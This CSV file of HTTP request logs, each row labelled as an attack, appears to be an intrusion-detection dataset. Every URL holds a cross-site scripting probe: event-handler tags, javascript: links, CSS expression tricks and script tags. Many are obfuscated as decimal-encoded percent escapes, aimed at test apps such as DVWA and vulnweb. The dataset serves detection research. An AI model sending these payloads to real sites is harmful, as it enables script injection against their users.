timestamp,session_id,src_ip,src_port,dst_ip,host,url,user_agent,response_size,status_code,status_message,unknown10,attack
1556344437,CCKny41iBZ9zYY5FJb,192.168.1.32,41198,176.28.50.165,testphp.vulnweb.com,"/37,51,99,37,54,56,37,55,52,37,54,100,37,54,99,37,50,48,37,54,102,37,54,101,37,52,100,37,54,102,37,55,53,37,55,51,37,54,53,37,52,99,37,54,53,37,54,49,37,55,54,37,54,53,37,50,48,37,54,56,37,55,52,37,54,100,37,54,99,37,50,48,37,54,102,37,54,101,37,52,100,37,54,102,37,55,53,37,55,51,37,54,53,37,52,99,37,54,53,37,54,49,37,55,54,37,54,53,37,51,100,37,50,50,37,54,97,37,54,49,37,55,54,37,54,49,37,55,51,37,54,51,37,55,50,37,54,57,37,55,48,37,55,52,37,51,97,37,51,48,37,51,55,37,51,55,37,51,51,37,51,53,37,51,52,37,54,52,37,54,50,37,51,55,37,51,54,37,51,50,37,54,54,37,51,51,37,51,52,37,51,56,37,54,54,37,54,52,37,54,54,37,54,53,37,54,53,37,51,49,37,51,56,37,54,49,37,51,55,37,51,56,37,51,48,37,54,54,37,54,54,37,51,49,37,54,54,37,51,55,37,54,54,37,50,50,37,51,101,37,51,99,37,50,102,37,54,56,37,55,52,37,54,100,37,54,99,37,50,48,37,54,102,37,54,101,37,52,100,37,54,102,37,55,53,37,55,51,37,54,53,37,52,99,37,54,53,37,54,49,37,55,54,37,54,53,37,51,101",hacking,168,404,Not Found,FhrNiE400IWAFBdDK9,1
1556341715,C2zyKw3gNtEL3doxyb,192.168.1.36,52654,176.28.50.165,testphp.vulnweb.com,"/<title onPropertyChange title onPropertyChange=""javascript:6f316bfb82a4e763e42de1fe57b73021""></title onPropertyChange>",Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/4.0; InfoPath.2; SV1; .NET CLR 2.0.50727; WOW64),570,404,Not Found,FJ8mpl4agGcUzFt6Cj,1
1556341737,CKwe0221tzxNWp82k7,192.168.1.36,53056,192.168.1.195,192.168.1.195,"/dvwa/vulnerabilities/sqli//<div datafld=""b"" dataformatas=""html"" datasrc=""",Mozilla/1.22 (compatible; MSIE 10.0; Windows 3.1),0,403,Forbidden,FF5Ape4JlYiYQVoJz6,1
1556344344,CzPlNL1JtLXedknJy8,192.168.1.36,48352,192.168.1.190,192.168.1.190,"/webmail/src/login.php37,51,99,37,54,50,37,54,102,37,54,52,37,55,57,37,50,48,37,54,102,37,54,101,37,52,99,37,54,102,37,54,49,37,54,52,37,50,48,37,54,50,37,54,102,37,54,52,37,55,57,37,50,48,37,54,102,37,54,101,37,52,99,37,54,102,37,54,49,37,54,52,37,51,100,37,50,50,37,54,97,37,54,49,37,55,54,37,54,49,37,55,51,37,54,51,37,55,50,37,54,57,37,55,48,37,55,52,37,51,97,37,54,97,37,54,49,37,55,54,37,54,49,37,55,51,37,54,51,37,55,50,37,54,57,37,55,48,37,55,52,37,51,97,37,51,49,37,51,52,37,51,57,37,51,48,37,54,53,37,51,52,37,51,50,37,51,55,37,54,54,37,51,54,37,51,49,37,54,53,37,54,50,37,51,54,37,51,57,37,54,49,37,51,49,37,51,51,37,51,52,37,54,54,37,51,51,37,51,55,37,51,53,37,54,50,37,54,51,37,51,48,37,54,51,37,54,54,37,51,56,37,51,54,37,54,54,37,51,55,37,50,50,37,51,101,37,51,99,37,50,102,37,54,50,37,54,102,37,54,52,37,55,57,37,50,48,37,54,102,37,54,101,37,52,99,37,54,102,37,54,49,37,54,52,37,51,101",hacking,1188,403,Forbidden,F0CBz51wtoLfHce7Z1,1
1556342884,CLVN1y1FmvGM0Gr0dk,192.168.1.32,59760,192.168.1.152,192.168.1.152,"/37,51,99,37,54,57,37,54,54,37,55,50,37,54,49,37,54,100,37,54,53,37,50,102,37,50,53,37,51,48,37,51,48,37,50,102,37,50,48,37,55,51,37,55,50,37,54,51,37,51,100,37,54,97,37,54,49,37,55,54,37,54,49,37,53,51,37,52,51,37,53,50,37,52,57,37,53,48,37,53,52,37,50,54,37,54,51,37,54,102,37,54,99,37,54,102,37,54,101,37,51,98,37,54,49,37,54,99,37,54,53,37,55,50,37,55,52,37,50,56,37,51,54,37,54,51,37,51,49,37,51,51,37,51,55,37,51,55,37,54,50,37,51,56,37,54,51,37,54,51,37,54,52,37,51,53,37,51,53,37,51,50,37,54,54,37,54,52,37,54,50,37,51,51,37,54,53,37,54,49,37,51,53,37,51,52,37,54,52,37,54,50,37,54,52,37,51,50,37,51,57,37,54,54,37,54,54,37,51,54,37,54,50,37,54,54,37,50,57",hacking,951,403,Forbidden,F2CHrY1RKQyDAGLFgc,1
1556343287,CnSmnR21i4iSJBRgu9,192.168.1.36,51426,176.28.50.165,testphp.vulnweb.com,"/37,51,99,37,55,51,37,54,51,37,55,50,37,54,57,37,55,48,37,55,52,37,50,48,37,55,51,37,55,50,37,54,51,37,51,100,37,50,50,37,54,52,37,54,49,37,55,52,37,54,49,37,51,97,37,55,52,37,54,53,37,55,56,37,55,52,37,50,102,37,54,97,37,54,49,37,55,54,37,54,49,37,55,51,37,54,51,37,55,50,37,54,57,37,55,48,37,55,52,37,50,99,37,54,49,37,54,99,37,54,53,37,55,50,37,55,52,37,50,56,37,54,50,37,54,52,37,54,51,37,51,48,37,54,53,37,54,54,37,51,50,37,51,53,37,51,49,37,51,52,37,54,54,37,51,57,37,54,54,37,51,50,37,54,52,37,51,48,37,54,50,37,51,56,37,51,56,37,51,51,37,54,51,37,51,55,37,51,53,37,51,48,37,51,49,37,51,53,37,51,48,37,51,51,37,54,50,37,54,54,37,51,57,37,51,56,37,50,57,37,50,50,37,51,101,37,51,99,37,50,102,37,55,51,37,54,51,37,55,50,37,54,57,37,55,48,37,55,52,37,51,101",hacking,168,404,Not Found,FDjrho3CYjQgsUzMig,1
1556344372,CVQYlV3dd1oELj8T9,192.168.1.32,57780,52.28.231.150,www.mqtt-dashboard.com,"/<LAYER SRC=""javascript:759d2fc08d0265f9721e18fbe662a512></LAYER>",Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:5.0) Whistler/20110021 myibrow/5.0.0.0,0,400,BAD_REQUEST,FF5Ape4JlYiYQVoJz6,1
1556343370,CsJ2mUMhB7AGmjpOc,192.168.1.36,50552,192.168.1.190,192.168.1.190,/webmail/src/login.php<style>p[foo=bar{}*{-o-link:'javascript:10442b569e41a109b359a4439337752a'}{}*{-o-link-source:current}]{color:red};</style>,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",432,404,Not Found,FMgXGF3Qwcyl8mYRQc,1
1556343548,CSKLQz0l8hodg8wFe,192.168.1.32,45370,18.194.169.124,www.mqtt-dashboard.com,"/37,51,99,37,50,53,37,51,99,37,50,49,37,50,100,37,50,100,37,50,55,37,50,53,37,51,101,37,51,99,37,55,51,37,54,51,37,55,50,37,54,57,37,55,48,37,55,52,37,51,101,37,54,49,37,54,99,37,54,53,37,55,50,37,55,52,37,50,56,37,54,49,37,54,49,37,51,49,37,51,57,37,54,51,37,51,48,37,54,52,37,51,52,37,54,51,37,51,57,37,54,50,37,54,51,37,51,48,37,51,56,37,51,56,37,51,50,37,54,51,37,54,50,37,54,51,37,54,51,37,51,48,37,51,51,37,51,50,37,54,53,37,51,54,37,54,52,37,54,51,37,51,51,37,51,49,37,51,48,37,51,48,37,54,53,37,50,57,37,51,98,37,51,99,37,50,102,37,55,51,37,54,51,37,55,50,37,54,57,37,55,48,37,55,52,37,50,48,37,50,100,37,50,100,37,51,101",hacking,837,403,Forbidden,FPaVs13OlSs65dT6rc,1
1556343044,C3NkYs3KDWVsgkwZOi,192.168.1.32,49998,192.168.1.190,192.168.1.190,"/webmail/src/login.php37,51,99,37,55,51,37,55,52,37,55,57,37,54,99,37,54,53,37,50,48,37,54,102,37,54,101,37,52,99,37,54,102,37,54,49,37,54,52,37,50,48,37,55,51,37,55,52,37,55,57,37,54,99,37,54,53,37,50,48,37,54,102,37,54,101,37,52,99,37,54,102,37,54,49,37,54,52,37,51,100,37,50,50,37,54,97,37,54,49,37,55,54,37,54,49,37,55,51,37,54,51,37,55,50,37,54,57,37,55,48,37,55,52,37,51,97,37,54,97,37,54,49,37,55,54,37,54,49,37,55,51,37,54,51,37,55,50,37,54,57,37,55,48,37,55,52,37,51,97,37,54,53,37,51,51,37,54,49,37,54,54,37,54,52,37,51,55,37,51,55,37,51,52,37,51,49,37,51,49,37,54,54,37,51,55,37,54,54,37,51,53,37,51,48,37,54,49,37,54,50,37,54,49,37,54,49,37,54,53,37,51,56,37,54,53,37,51,51,37,51,55,37,51,49,37,51,48,37,51,48,37,54,49,37,54,53,37,51,56,37,51,57,37,54,53,37,50,50,37,51,101,37,51,99,37,50,102,37,55,51,37,55,52,37,55,57,37,54,99,37,54,53,37,50,48,37,54,102,37,54,101,37,52,99,37,54,102,37,54,49,37,54,52,37,51,101",hacking,1212,403,Forbidden,F4f5Go1zXEnhqwYZN1,1
1556341703,CFmBtn10yJjgXxAU82,192.168.1.36,43598,192.168.1.195,192.168.1.195,"/dvwa/vulnerabilities/sqli//<DIV STYLE=""width: expression(f4b4bf549bf4c26f19c1748cab4cc1eb);"">",Mozilla/1.22 (compatible; MSIE 10.0; Windows 3.1),980,400,Bad Request,Fg8wGJ16gnY6yJaoI8,1
1556341404,CyqsHBHSixE8cePQ8,192.168.1.32,56636,18.194.169.124,www.mqtt-dashboard.com,"/37,51,99,37,52,57,37,52,101,37,53,48,37,53,53,37,53,52,37,50,48,37,53,52,37,53,57,37,53,48,37,52,53,37,51,100,37,50,50,37,52,57,37,52,100,37,52,49,37,52,55,37,52,53,37,50,50,37,50,48,37,53,51,37,53,50,37,52,51,37,51,100,37,50,50,37,54,54,37,54,54,37,51,48,37,51,53,37,54,52,37,51,51,37,51,53,37,54,53,37,51,54,37,51,55,37,51,50,37,51,48,37,51,54,37,54,53,37,54,52,37,51,55,37,51,49,37,54,54,37,51,51,37,51,50,37,51,51,37,51,49,37,51,54,37,54,54,37,51,51,37,51,50,37,51,56,37,51,50,37,54,50,37,54,52,37,51,50,37,54,50,37,50,50,37,51,101",hacking,744,403,Forbidden,FlPSkz1MQ4T9HhGq3i,1
1556343777,CSVNF62iKNx5zmF6Fl,192.168.1.32,52898,176.28.50.165,testphp.vulnweb.com,"/37,51,99,37,54,102,37,54,50,37,54,97,37,54,53,37,54,51,37,55,52,37,50,48,37,54,52,37,54,49,37,55,52,37,54,49,37,51,100,37,54,97,37,54,49,37,55,54,37,54,49,37,55,51,37,54,51,37,55,50,37,54,57,37,55,48,37,55,52,37,50,54,37,54,51,37,54,102,37,54,99,37,54,102,37,54,101,37,51,98,37,53,99,37,55,53,37,51,48,37,51,48,37,51,54,37,51,49,37,50,54,37,50,51,37,55,56,37,51,54,37,52,51,37,51,98,37,50,54,37,50,51,37,51,49,37,51,48,37,51,49,37,50,53,37,51,55,37,51,50,37,55,52,37,50,56,37,54,52,37,54,51,37,51,50,37,54,49,37,51,49,37,51,54,37,51,51,37,54,54,37,51,52,37,54,50,37,54,49,37,51,48,37,51,52,37,54,50,37,51,56,37,51,48,37,51,57,37,51,57,37,51,55,37,51,53,37,51,50,37,54,52,37,54,50,37,51,50,37,51,55,37,54,51,37,51,51,37,54,52,37,51,57,37,54,52,37,51,56,37,51,57,37,50,57,37,51,101",hacking,168,404,Not Found,FzgFVk4AxDCGHTIOCa,1
1556342664,C1ZyTF2XtECNCFAoP4,192.168.1.32,47238,192.168.1.152,192.168.1.152,"/<body onload body onload=""javascript:javascript:268e3a9ca419e19eb832678495d912b8""></body onload>",DonutP; Windows98SE,301,400,Bad Request,FTtTOI2pLcLuHCYdMc,1
1556343365,CnFGO31zxHAuz3l9tj,192.168.1.32,36320,192.168.1.152,192.168.1.152,"/<! foo=""[[[Inception]]""><x foo=""]foo><script>javascript:d13c0ef82921683eadaedd75c7e3c408</script>"">",Mozilla/5.0 (Macintosh; Intel Mac OS X 10.11; rv:49.0) Gecko/20100101 Firefox/49.0,301,400,Bad Request,FeW8c04WyIGxlRZRD8,1
1556343575,CThXz942IOCWuYntle,192.168.1.36,56664,192.168.1.195,192.168.1.195,/dvwa/vulnerabilities/xss_r/?name=admin/,Crawler@alexa.com,0,302,Found,FF5Ape4JlYiYQVoJz6,1
1556344535,COXjcs2euyj4wiR4se,192.168.1.36,52814,192.168.1.195,192.168.1.195,"/dvwa/vulnerabilities/sqli//37,51,99,37,54,50,37,54,102,37,54,52,37,55,57,37,50,48,37,54,102,37,54,101,37,52,100,37,54,102,37,55,53,37,55,51,37,54,53,37,52,53,37,54,101,37,55,52,37,54,53,37,55,50,37,50,48,37,54,50,37,54,102,37,54,52,37,55,57,37,50,48,37,54,102,37,54,101,37,52,100,37,54,102,37,55,53,37,55,51,37,54,53,37,52,53,37,54,101,37,55,52,37,54,53,37,55,50,37,51,100,37,50,50,37,54,97,37,54,49,37,55,54,37,54,49,37,55,51,37,54,51,37,55,50,37,54,57,37,55,48,37,55,52,37,51,97,37,54,97,37,54,49,37,55,54,37,54,49,37,55,51,37,54,51,37,55,50,37,54,57,37,55,48,37,55,52,37,51,97,37,51,57,37,51,57,37,51,57,37,51,57,37,54,49,37,54,54,37,51,55,37,51,54,37,51,50,37,51,53,37,51,57,37,51,52,37,51,57,37,51,48,37,51,50,37,51,56,37,54,50,37,51,49,37,54,49,37,51,56,37,54,53,37,54,54,37,54,50,37,54,49,37,51,54,37,54,53,37,54,49,37,51,57,37,51,57,37,54,51,37,54,53,37,51,48,37,50,50,37,51,101,37,51,99,37,50,102,37,54,50,37,54,102,37,54,52,37,55,57,37,50,48,37,54,102,37,54,101,37,52,100,37,54,102,37,55,53,37,55,51,37,54,53,37,52,53,37,54,101,37,55,52,37,54,53,37,55,50,37,51,101",hacking,1504,403,Forbidden,FTfxkv42RhkfIanEwc,1
1556344059,Cff4Tj1BPOZx78iaOj,192.168.1.36,59824,192.168.1.190,192.168.1.190,/webmail/src/login.php<ScRipT 5-0*3+9/3=>prompt(35843e449862a174b020d8b7d2de988b)</ScRipT giveanswerhere=?,"Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",308,404,Not Found,F3uvma2pg8zTJdvP42,1
1556343662,Cv2MZo1bgZMRXpERb4,192.168.1.36,35830,192.168.1.152,192.168.1.152,"/37,51,99,37,54,49,37,55,48,37,55,48,37,54,99,37,54,53,37,55,52,37,50,48,37,54,102,37,54,101,37,55,50,37,54,53,37,54,49,37,54,52,37,55,57,37,55,51,37,55,52,37,54,49,37,55,52,37,54,53,37,54,51,37,54,56,37,54,49,37,54,101,37,54,55,37,54,53,37,50,48,37,54,49,37,55,48,37,55,48,37,54,99,37,54,53,37,55,52,37,50,48,37,54,102,37,54,101,37,55,50,37,54,53,37,54,49,37,54,52,37,55,57,37,55,51,37,55,52,37,54,49,37,55,52,37,54,53,37,54,51,37,54,56,37,54,49,37,54,101,37,54,55,37,54,53,37,51,100,37,50,50,37,54,97,37,54,49,37,55,54,37,54,49,37,55,51,37,54,51,37,55,50,37,54,57,37,55,48,37,55,52,37,51,97,37,54,97,37,54,49,37,55,54,37,54,49,37,55,51,37,54,51,37,55,50,37,54,57,37,55,48,37,55,52,37,51,97,37,54,51,37,54,54,37,51,52,37,51,48,37,54,49,37,51,52,37,51,48,37,51,56,37,54,52,37,51,55,37,51,48,37,51,48,37,54,52,37,54,51,37,54,54,37,51,55,37,51,51,37,51,56,37,54,52,37,51,54,37,51,51,37,51,55,37,54,52,37,51,49,37,51,52,37,51,48,37,51,53,37,51,53,37,51,56,37,51,54,37,54,49,37,51,56,37,50,50,37,51,101,37,51,99,37,50,102,37,54,49,37,55,48,37,55,48,37,54,99,37,54,53,37,55,52,37,50,48,37,54,102,37,54,101,37,55,50,37,54,53,37,54,49,37,54,52,37,55,57,37,55,51,37,55,52,37,54,49,37,55,52,37,54,53,37,54,51,37,54,56,37,54,49,37,54,101,37,54,55,37,54,53,37,51,101",hacking,1542,403,Forbidden,FIZdsO0hxXGS23Cee,1
1556342630,CQ6OfN2CfM5cjKCN7f,192.168.1.32,50232,192.168.1.190,192.168.1.190,"/webmail/src/login.php37,51,99,37,54,49,37,50,48,37,55,51,37,55,52,37,55,57,37,54,99,37,54,53,37,51,100,37,50,50,37,55,48,37,54,102,37,54,57,37,54,101,37,55,52,37,54,53,37,55,50,37,50,100,37,54,53,37,55,54,37,54,53,37,54,101,37,55,52,37,55,51,37,51,97,37,54,101,37,54,102,37,54,101,37,54,53,37,51,98,37,55,48,37,54,102,37,55,51,37,54,57,37,55,52,37,54,57,37,54,102,37,54,101,37,51,97,37,54,49,37,54,50,37,55,51,37,54,102,37,54,99,37,55,53,37,55,52,37,54,53,37,51,98,37,50,50,37,51,101,37,51,99,37,54,49,37,50,48,37,55,51,37,55,52,37,55,57,37,54,99,37,54,53,37,51,100,37,50,50,37,55,48,37,54,102,37,55,51,37,54,57,37,55,52,37,54,57,37,54,102,37,54,101,37,51,97,37,54,49,37,54,50,37,55,51,37,54,102,37,54,99,37,55,53,37,55,52,37,54,53,37,51,98,37,50,50,37,50,48,37,54,102,37,54,101,37,54,51,37,54,99,37,54,57,37,54,51,37,54,98,37,51,100,37,50,50,37,54,51,37,51,49,37,51,52,37,54,49,37,51,56,37,54,51,37,51,52,37,51,48,37,51,57,37,51,57,37,54,51,37,51,56,37,51,49,37,51,53,37,51,48,37,51,52,37,51,52,37,51,50,37,54,51,37,51,48,37,51,56,37,51,51,37,51,50,37,54,54,37,51,53,37,54,51,37,51,49,37,54,50,37,51,49,37,54,53,37,51,51,37,51,56,37,51,98,37,50,50,37,51,101,37,53,56,37,53,56,37,53,56,37,51,99,37,50,102,37,54,49,37,51,101,37,51,99,37,50,102,37,54,49,37,51,101,37,51,99,37,54,49,37,50,48,37,54,56,37,55,50,37,54,53,37,54,54,37,51,100,37,50,50,37,54,97,37,54,49,37,55,54,37,54,49,37,55,51,37,54,51,37,55,50,37,54,57,37,55,48,37,55,52,37,51,97,37,54,51,37,51,49,37,51,52,37,54,49,37,51,56,37,54,51,37,51,52,37,51,48,37,51,57,37,51,57,37,54,51,37,51,56,37,51,49,37,51,53,37,51,48,37,51,52,37,51,52,37,51,50,37,54,51,37,51,48,37,51,56,37,51,51,37,51,50,37,54,54,37,51,53,37,54,51,37,51,49,37,54,50,37,51,49,37,54,53,37,51,51,37,51,56,37,50,50,37,51,101,37,53,56,37,53,56,37,53,56,37,51,99,37,50,102,37,54,49,37,51,101",hacking,2102,403,Forbidden,FXw1N25fW6zFyirkj,1
1556344210,CLXepm3mPEeDJ1QVMk,192.168.1.32,33564,18.194.169.124,www.mqtt-dashboard.com,"/37,51,99,37,52,57,37,52,100,37,52,55,37,50,48,37,53,51,37,53,50,37,52,51,37,51,100,37,54,48,37,51,54,37,54,53,37,51,57,37,54,54,37,54,51,37,54,49,37,51,49,37,54,49,37,51,53,37,54,50,37,54,49,37,51,52,37,51,51,37,54,49,37,54,52,37,54,54,37,51,50,37,51,51,37,51,54,37,51,51,37,54,54,37,54,50,37,51,48,37,54,49,37,51,48,37,51,49,37,51,48,37,54,53,37,51,54,37,51,57,37,54,54,37,51,54,37,54,48,37,51,101",hacking,607,403,Forbidden,FOB2bA1Efyrozwo7Xl,1
